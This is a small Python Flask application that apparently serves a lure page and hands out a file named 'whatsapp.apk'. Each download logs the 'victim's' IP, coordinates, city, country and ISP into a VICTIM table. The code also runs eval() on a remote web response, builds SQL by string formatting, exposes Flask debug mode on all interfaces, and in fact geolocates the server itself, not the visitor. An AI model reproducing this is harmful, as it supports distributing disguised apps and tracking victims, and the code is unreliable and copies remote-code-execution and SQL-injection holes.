from flask import Flask, render_template, send_file
import requests, sqlite3, json 
from datetime import datetime

vcid = str(datetime.now()).replace(" ", "").replace("-", "").replace(":", "").replace(".", "")

conn= sqlite3.connect("database.db", check_same_thread=False )
app = Flask(__name__)
def conexiond(conn):
    print ("Opened database successfully")
    return conn
    
def createtables(conn):conn.execute("""CREATE TABLE IF NOT EXISTS VICTIM(
        victimid VARCHAR(50) PRIMARY KEY NOT NULL,
        IP VARCHAR(40)NOT NULL,
        latitud VARCHAR(50) NOT NULL,
        longitud VARCHAR(50) NOT NULL,
        city VARCHAR(50) NOT NULL,
        country VARCHAR(50) NOT NULL,
        isp VARCHAR(50) NOT NULL
        )""")



def sendinfo(conn):
    r=eval(requests.get("http://ip-api.com/json").text)
    conn.execute(f"INSERT INTO VICTIM VALUES ('{vcid}', '{r['query']}', '{r['lat']}', '{r['lon']}', '{r['city']}', '{r['country']}',       '{r['isp']}');")
    conn.commit()

@app.route('/', methods=['GET'])
def index():
    createtables(conn)    
    return render_template('index.html')

@app.route('/download', methods=['GET', 'POST'])
def download():

    sendinfo(conn)
    path = "download/whatsapp.apk"
    return send_file(path, as_attachment=True)



if __name__ == "__main__":

    app.run(host='0.0.0.0', port=5000, debug=True)
